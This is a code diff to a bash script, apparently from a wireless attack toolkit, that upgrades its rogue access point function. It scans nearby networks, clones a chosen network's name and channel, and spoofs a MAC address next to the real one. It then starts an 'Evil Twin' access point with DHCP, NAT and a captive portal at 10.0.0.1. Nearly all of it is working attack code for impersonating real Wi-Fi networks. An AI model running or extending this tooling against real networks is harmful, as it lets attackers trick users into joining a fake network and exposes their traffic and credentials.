@@ -126,12 +126,47 @@ EOF
 function start_rogue_ap(){
     check_deps
     prompt_iface
-    read -p "SSID to Clone (target): " FAKESSID; [ -z "$FAKESSID" ] && echo -e "${RED}No SSID entered${NC}" && return
-    while true; do read -p "Channel (e.g. 6): " CHANNEL; [[ "$CHANNEL" =~ ^[0-9]+$ ]] && break; echo -e "${RED}Invalid channel number${NC}"; done
-    read -p "Set WPA2 Key (fake, for realism): " FAKEPASS; [ -z "$FAKEPASS" ] && echo -e "${RED}No passphrase entered${NC}" && return
+    echo -e "${CYAN}Scanning for APs. Please wait...${NC}"
+    SCAN_FILE=$(mktemp)
+    sudo timeout 5s iw "$IFACE" scan 2>/dev/null > "$SCAN_FILE"
+    MAPSIDS=()
+    MACS=()
+    CHANS=()
+    id=1
+    while read -r mac;
+    do
+        ssid=$(awk -v mac="$mac" '
+            $0 ~ mac {found=1}
+            found && /SSID:/ {sub("SSID: ", ""); print; exit}
+        ' "$SCAN_FILE" | head -1)
+        chan=$(awk -v mac="$mac" '
+            $0 ~ mac {found=1}
+            found && /primary channel:/ {print $3; exit}
+        ' "$SCAN_FILE" | head -1)
+        [ -z "$ssid" ] && continue
+        printf "%2d) SSID: %-30s BSSID: %s Channel: %s\n" $id "$ssid" "$mac" "$chan"
+        MAPSIDS+=("$ssid")
+        MACS+=("$mac")
+        CHANS+=("$chan")
+        id=$((id+1))
+    done < <(grep -oE 'BSS ([0-9A-Fa-f:]{17})' "$SCAN_FILE" | awk '{print $2}' | uniq)
+    rm -f "$SCAN_FILE"
+    if [ ${#MACS[@]} -eq 0 ]; then echo -e "${RED}No AP found!${NC}"; return; fi
+    read -p "Clone which AP? (number): " twin
+    twinidx=$((twin-1))
+    FAKESSID="${MAPSIDS[$twinidx]}"
+    REALMAC="${MACS[$twinidx]}"
+    CHANNEL="${CHANS[$twinidx]}"
+    if [ -z "$FAKESSID" ] || [ -z "$REALMAC" ]; then echo -e "${RED}Invalid selection.${NC}"; return; fi
+    read -p "Set fake WPA2 password: " FAKEPASS
+    IFS=':' read -r -a macarr <<< "$REALMAC"
+    last=$(( 0x${macarr[5]} ))
+    new_last=$(printf "%02x" $(( (last + 1) & 0xff )) )
+    FAKEMAC="${macarr[0]}:${macarr[1]}:${macarr[2]}:${macarr[3]}:${macarr[4]}:$new_last"
     ip link set "$IFACE" down 2>/dev/null
+    ip link set "$IFACE" address "$FAKEMAC"
+    ip link set "$IFACE" up
     ip addr flush dev "$IFACE" 2>/dev/null
-    ip link set "$IFACE" up 2>/dev/null
     ip addr add 10.0.0.1/24 dev "$IFACE"
     pkill -f 'hostapd.*config' 2>/dev/null || true
     pkill -f 'dnsmasq.*config' 2>/dev/null || true
@@ -141,7 +176,7 @@ function start_rogue_ap(){
     dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
     iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
     iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
-    echo -e "${GREEN}[+] Evil Twin running on 10.0.0.1${NC}"
+    echo -e "${GREEN}[+] Evil Twin \"$FAKESSID\" running on channel $CHANNEL, MAC $FAKEMAC, captive portal at 10.0.0.1${NC}"
 }
 
 function deauth_attack() {
